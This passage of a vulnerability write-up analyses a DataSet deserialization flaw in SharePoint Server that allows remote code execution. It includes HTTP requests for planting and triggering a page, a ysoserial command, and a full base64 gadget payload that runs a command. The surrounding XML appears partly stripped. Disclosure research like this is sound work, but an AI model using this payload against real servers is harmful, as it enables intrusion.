    }
At [1] the code checks that the request is a POST back request. To ensure
this, an attacker can set the `__viewstate` POST variable, then at [2] the
code will check that the `__SUGGESTIONSCACHE__` POST variable is set, if it’s
set, the `IsInitialPostBack` getter will return false. As long as this getter
returns false, an attacker can land at [3], reaching
`PopulateDataSetFromCache`. This call will use a `DataSet` that has been
created with a specific schema definition.
    protected void PopulateDataSetFromCache(DataSet ds)
    {
        string value = SPRequestParameterUtility.GetValue(this.Page.Request, "__SUGGESTIONSCACHE__", SPRequestParameterSource.Form);
        using (XmlTextReader xmlTextReader = new XmlTextReader(new StringReader(value)))
        {
            xmlTextReader.DtdProcessing = DtdProcessing.Prohibit;
            ds.ReadXml(xmlTextReader);                                                                              // 4
            ds.AcceptChanges();
        }
    }
Inside of `PopulateDataSetFromCache`, the code
calls`SPRequestParameterUtility.GetValue` to get attacker controlled data from
the `__SUGGESTIONSCACHE__` request variable and parses it directly into
`ReadXml` using `XmlTextReader`. The previously defined schema is overwritten
with the attacker supplied schema inside of the supplied XML and
deserialization of untrusted types occurs at [4], leading to remote code
execution. To trigger this, I created a page that uses the
`ContactLinksSuggestionsMicroView` type specifically:
    PUT /poc.aspx HTTP/1.1
    Host: 
    Authorization: 
    Content-Length: 252
If you are exploiting this bug as a low privlidged user and the
`AddAndCustomizePages` setting is disabled, then you can possibly exploit the
bug with pages that instantiate the
`InputFormContactLinksSuggestionsMicroView` control, since it extends from
`ContactLinksSuggestionsMicroView`.
    namespace Microsoft.SharePoint.Portal.WebControls
    {
     [SharePointPermission(SecurityAction.Demand, ObjectModel = true)]
     [AspNetHostingPermission(SecurityAction.LinkDemand, Level = AspNetHostingPermissionLevel.Minimal)]
     [AspNetHostingPermission(SecurityAction.InheritanceDemand, Level = AspNetHostingPermissionLevel.Minimal)]
     [SharePointPermission(SecurityAction.InheritanceDemand, ObjectModel = true)]
     public class InputFormContactLinksSuggestionsMicroView : ContactLinksSuggestionsMicroView
    {
The endpoints I found (but remain untested) are:
  1. `https:///_layouts/15/quicklinks.aspx`
  2. `https:///_layouts/15/quicklinksdialogform.aspx`
Now, to exploit it we can perform a post request to our freshly crafted page:
    POST /poc.aspx HTTP/1.1
    Host: 
    Authorization: 
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 
    __viewstate=&__SUGGESTIONSCACHE__=
### One Last Thing
You cannot use the `XamlReader.Load` static method because the IIS webserver
is impersonating as the IUSR account and that account has limited access to
the registry. If you try, you will end up with a stack trace like this unless
you disable impersonation under IIS and use the application pool identity:
    {System.InvalidOperationException: There is an error in the XML document. ---> System.TypeInitializationException: The type initializer for 'MS.Utility.EventTrace' threw an exception. ---> System.Security.SecurityException: Requested registry access is not allowed.
       at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
       at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
       at Microsoft.Win32.RegistryKey.OpenSubKey(String name)
       at Microsoft.Win32.Registry.GetValue(String keyName, String valueName, Object defaultValue)
       at MS.Utility.EventTrace.IsClassicETWRegistryEnabled()
       at MS.Utility.EventTrace..cctor()
       --- End of inner exception stack trace ---       at MS.Utility.EventTrace.EasyTraceEvent(Keyword keywords, Event eventID, Object param1)
       at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader, List`1 safeTypes)
       at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader)
       at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode)
       at System.Windows.Markup.XamlReader.Load(XmlReader reader)
       at System.Windows.Markup.XamlReader.Parse(String xamlText)
       --- End of inner exception stack trace ---       at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle, XmlDeserializationEvents events)
       at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle)
       at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
       at System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
       at System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
       at System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
       at System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
       at System.Data.XmlDataLoader.LoadData(XmlReader reader)
       at System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
       at System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
       at System.Data.DataSet.ReadXml(XmlReader reader)
       at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet ds)
       at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
    at Microsoft.SharePoint.Portal.WebControls.PrivacyItemView.GetQueryResults(Object obj)
You need to find another dangerous static method or setter to call from a type
that doesn’t use interface members, ~~I leave this as an exercise to the
reader, good luck!~~
### Remote Code Execution Exploit
Ok so I lied. Look the truth is, I just want people to read the full blog post
and not rush to find the exploit payload, it’s better to understand the
underlying technology you know? Anyway, to exploit this bug we can (ab)use the
`LosFormatter.Deserialize` method since the class contains no interface
members. To do so, we need to generate a base64 payload of a serialized
`ObjectStateFormatter` gadget chain:
`c:\> ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c mspaint`
Now, we can plug the payload into the following DataSet gadget and trigger
remote code execution against the target SharePoint Server!
      " xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset">
            " xmlns:xsd="">
                Deserialize
                    " xmlns:xsd="" xsi:type="xsd:string">/wEykwcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC1BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBtc3BhaW50IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=
## 0x03 Conclusion
Microsoft rate this bug with an exploitability index rating of 1 and we agree,
meaning you should patch this immediately if you haven’t. It is highly likley
that this gadget chain can be used against several applications built with
.net so even if you don’t have a SharePoint Server installed, you are still
impacted by this bug.
## 0x04 References
[Attacking .NET Serialization – Speaker
Deck](https://speakerdeck.com/pwntester/attacking-net-serialization)
[DataSet and DataTable security guidance – ADO.NET | Microsoft
Docs](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance)
[ZDI-20-874 | Zero Day
Initiative](https://www.zerodayinitiative.com/advisories/ZDI-20-874/)
## 0x05 时间线
**2020-07-20** 360核心安全团队发布报告
**2020-07-21** 360CERT转发分析报告
## 0x06 原文链接
  1. [SharePoint and Pwn :: Remote Code Execution Against SharePoint Server Abusing DataSet](https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html)